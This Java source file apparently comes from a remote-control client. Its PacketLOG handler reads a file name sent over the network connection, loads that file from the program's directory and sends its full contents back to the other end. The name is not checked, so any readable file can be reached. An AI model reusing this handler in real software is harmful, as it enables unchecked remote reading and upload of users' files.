package com.redpois0n.packets;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.Util;


public class PacketLOG extends Packet {

	@Override
	public void read(String line) throws Exception {
		String what = Connection.readLine();
		File file = new File(Util.getPath().getAbsolutePath() + File.separator + what);
		FileInputStream in = new FileInputStream(file);
		BufferedReader reader = new BufferedReader(new InputStreamReader(in));
		String log = "";
		while ((line = reader.readLine()) != null) {
			log += line + "\n";
		}
		reader.close();
		Connection.writeLine("LOG");
		Connection.writeLine(what);
		Connection.writeLine(log);
	}

}
